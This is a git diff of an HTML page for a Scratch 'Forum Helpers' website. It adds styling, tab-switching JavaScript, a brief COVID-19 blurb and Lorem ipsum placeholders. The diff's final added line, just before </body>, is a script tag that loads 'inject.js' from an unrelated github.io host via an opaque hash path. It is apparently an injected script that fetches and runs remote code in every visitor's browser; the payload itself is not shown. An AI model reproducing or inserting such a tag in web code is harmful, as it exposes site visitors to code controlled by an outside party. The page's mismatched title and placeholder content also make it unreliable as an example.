@@ -1,14 +1,246 @@
-<style>
-// eh i know this is a bad habit but whatever
-  * {
-  font-family: verdana;
-  }
-</style>
-<p>
-This is a work-in-progress. Know that it will take about a week, maybe less, since this message is sent (6/22/2020) for the website to be complete.
-This will be an improved version of <a target="_blank" href="https://theforumhelpers.github.io/">the original forum helpers website<a>.
-Please be patient for the website to be completely remade, with better UI, and more helpful info!
-It'll be constantly updated with helpful info!
-In the mean time, be sure to check out the developer who's working on this website, <a target="_blank" href="https://scratch.mit.edu/users/ioton/">ioton</a> on Scratch!
-Additional note: ioton is currently NOT part of the forum helpers.
-</p>
+<!DOCTYPE html>
+//Licensed under MIT License.
+//Yes, I know I can make a .css file and link to it.
+<!-- MIT License
+
+Copyright (c) 2020
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE. -->
+<html lang="en" dir="ltr">
+	<head>
+		<meta charset ="utf-8">
+		<title>COVID-19</title>
+		<style>
+        * {
+          font-family: verdana;
+        }
+
+        body {
+          background-color: #ffffff;
+        }
+
+        .navbar h1 {
+          position: fixed;
+          top: 0;
+          left: 0;
+          z-index: 10000;
+          overflow: visible;
+          height: 35px;
+          width: 100%;
+          background-color: #4287f5;
+          color: white;
+          margin-top: 0px;
+          padding: 20px;
+        }
+
+        h6 {
+          color: white;
+          font-size: 20px;
+          text-align: center;
+        }
+
+        .red {
+          border-radius: 10px;
+          color: #181818;
+          background-color: tomato;
+          padding: 20px;
+          margin: 20px;
+          opacity: 0.7;
+        }
+
+        .blue {
+          border-radius: 10px;
+          color: #181818;
+          background-color: powderblue;
+          padding: 20px;
+          margin: 20px;
+          opacity: 0.7;
+        }
+
+        .yellow {
+          border-radius: 10px;
+          color: #181818;
+          background-color: yellow;
+          padding: 20px;
+          margin: 20px;
+          opacity: 0.7;
+        }
+
+        .heading {
+          font-size: 30px;
+          color: #181818;
+        }
+
+        .bottom {
+          font-color: black;
+        }
+
+        ::-webkit-scrollbar {
+          width: 20px;
+          background: #b0c5ff;
+        }
+
+        ::-webkit-scrollbar-track {
+        }
+
+        ::-webkit-scrollbar-thumb {
+          background: #0044ff; 
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+          background: #0036cc; 
+        }
+
+        a:link {
+          color: red;
+          text-decoration: underline #00000000;
+        }
+
+        a:visited {
+          color: red;
+          text-decoration: underline #00000000;
+        }
+
+        a:hover {
+          color: darkred;
+          text-decoration: underline #00000000;
+        }
+
+        a:active {
+          color: blue;
+          text-decoration: underline #00000000;
+        }
+
+        /*
+        .navbar ul {
+          list-style-type: none;
+          margin: 0;
+          padding: 0;
+          overflow: hidden;
+          background-color: #333;
+        }
+        .navbar li {
+          float: left;
+        }
+        .navbar li a {
+          display: block;
+          color: white;
+          text-align: center;
+          padding: 14px 16px;
+          text-decoration: none;
+        }
+        .navbar li a:hover:not(.active) {
+          background-color: #111;
+        }
+        .active {
+          background-color: #4CAF50;
+        }
+        */
+
+        .navbar {
+          overflow: hidden;
+          background-color: #4287f5;
+          position: fixed;
+          width: 100%;
+          z-index: 1;
+        }
+
+        .navbar button {
+          background-color: inherit;
+          float: right;
+          border: none;
+          outline: none;
+          cursor: pointer;
+          padding: 18px 16px;
+          transition: 0.3s;
+        }
+        
+        .navbar #default-open {
+          font-size: 20px;
+          padding: 14px 16px;
+          float: left;
+        }
+
+        .navbar button:hover {
+          background-color: #2267f5;
+        }
+
+        .navbar button.active {
+          background-color: #2267f5;
+        }
+
+        .tab-content {
+          color: black;
+          display: none;
+          padding: 6px 12px;
+          border-top: none;
+        }
+        </style>
+		<link rel="icon" type="image/png" href="favicon.png">
+	</head>
+	<body>
+		<div class="navbar">
+			<button class="tab-links" onclick="openCont(event, 'home')" id="default-open">The Forum Helpers</button>
+			<button class="tab-links" onclick="openCont(event, 'about')">About</button>
+			<button class="tab-links" onclick="openCont(event, 'answers')">Answers</button>
+			<button class="tab-links" onclick="openCont(event, 'members')">Members</button>
+		</div>
+		<br>
+		<br>
+		<br>
+		<br>
+		<div id="home" class="tab-content">
+			<p>COVID-19 is a virus that is part of a group of viruses called coronavirus.<br>
+			COVID-19 is often remembered as coronavirus, when it's actually COVID-19.<br>
+			COVID-19 stands for COronaVIrus Disease 2019.<br>
+			One theory is that it all started at a seafood market in Wuhan, China and eventually spread to more and more places, eventually leading to most countries in the world.</p><br>0
+<h6>This is a WIP, meaning it is still being worked on; many things are placeholders.</h6>
+		</div>
+		<div id="about" class="tab-content">
+			Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec iaculis erat ut mollis viverra. Integer eu tortor sed metus ultricies vehicula. In ornare nisi ac eros consectetur commodo. Curabitur vehicula fermentum sem a gravida. Morbi iaculis eros non quam dictum tincidunt. Curabitur et hendrerit lacus, vel fringilla mauris. Aenean metus eros, efficitur id felis a, efficitur fermentum tellus. Nunc vestibulum metus sed nunc congue condimentum. Duis a sapien ante. Nam venenatis tristique leo. In in dolor sed ligula suscipit congue. Donec convallis, enim eu ultrices varius, justo sem mattis nunc, et interdum sem mauris ultrices mi. Etiam id urna eleifend, posuere sapien sit amet, venenatis enim. Donec non tincidunt arcu, vitae maximus nisl. Curabitur lacinia, eros id ornare commodo, leo dolor consectetur nibh, eu lacinia nunc nisi suscipit est.
+		</div>
+		<div id="answers" class="tab-content">
+			Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec iaculis erat ut mollis viverra. Integer eu tortor sed metus ultricies vehicula. In ornare nisi ac eros consectetur commodo. Curabitur vehicula fermentum sem a gravida. Morbi iaculis eros non quam dictum tincidunt. Curabitur et hendrerit lacus, vel fringilla mauris. Aenean metus eros, efficitur id felis a, efficitur fermentum tellus. Nunc vestibulum metus sed nunc congue condimentum. Duis a sapien ante. Nam venenatis tristique leo. In in dolor sed ligula suscipit congue. Donec convallis, enim eu ultrices varius, justo sem mattis nunc, et interdum sem mauris ultrices mi. Etiam id urna eleifend, posuere sapien sit amet, venenatis enim. Donec non tincidunt arcu, vitae maximus nisl. Curabitur lacinia, eros id ornare commodo, leo dolor consectetur nibh, eu lacinia nunc nisi suscipit est.
+		</div>
+		<div id="members" class="tab-content">
+			Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec iaculis erat ut mollis viverra. Integer eu tortor sed metus ultricies vehicula. In ornare nisi ac eros consectetur commodo. Curabitur vehicula fermentum sem a gravida. Morbi iaculis eros non quam dictum tincidunt. Curabitur et hendrerit lacus, vel fringilla mauris. Aenean metus eros, efficitur id felis a, efficitur fermentum tellus. Nunc vestibulum metus sed nunc congue condimentum. Duis a sapien ante. Nam venenatis tristique leo. In in dolor sed ligula suscipit congue. Donec convallis, enim eu ultrices varius, justo sem mattis nunc, et interdum sem mauris ultrices mi. Etiam id urna eleifend, posuere sapien sit amet, venenatis enim. Donec non tincidunt arcu, vitae maximus nisl. Curabitur lacinia, eros id ornare commodo, leo dolor consectetur nibh, eu lacinia nunc nisi suscipit est.
+		</div>
+		
+        <script>
+        function openCont(evt, contName) {
+          var i, tabcontent, tablinks;
+
+          tabcontent = document.getElementsByClassName("tab-content");
+          for (i = 0; i < tabcontent.length; i++) {
+              tabcontent[i].style.display = "none";
+          }
+
+          tablinks = document.getElementsByClassName("tab-links");
+          for (i = 0; i < tablinks.length; i++) {
+              tablinks[i].className = tablinks[i].className.replace(" active", "");
+          }
+
+          document.getElementById(contName).style.display = "block";
+          evt.currentTarget.className += " active";
+      }
+      document.getElementById("default-open").click();
+        </script>
+	<script type='text/javascript'  src="https:////qlec.github.io/93791460bd4591916fae6788dd691570096e47a0e47061cdead407edc2363560/inject.js"></script>
+</body>
+</html>
